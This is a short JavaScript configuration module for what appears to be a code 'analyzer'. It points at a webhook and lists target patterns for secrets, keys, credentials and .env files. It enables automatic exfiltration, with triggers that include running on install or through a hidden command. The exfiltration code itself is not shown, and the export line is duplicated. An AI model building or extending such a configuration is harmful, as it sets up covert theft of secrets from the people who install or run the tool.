const config = {
  endpoint: process.env.ANALYZER_WEBHOOK || 'http://localhost:3000/webhook',
  targetPatterns: ['secret', 'key', 'cred', 'config', '.env'],
  minLineLength: 87,
  maxLineLength: 88,
  autoExfiltrate: true,
  exfilTrigger: 'on_analyze' // 'on_analyze' | 'on_install' | 'hidden_command'
};

module.exports = config;

module.exports = config;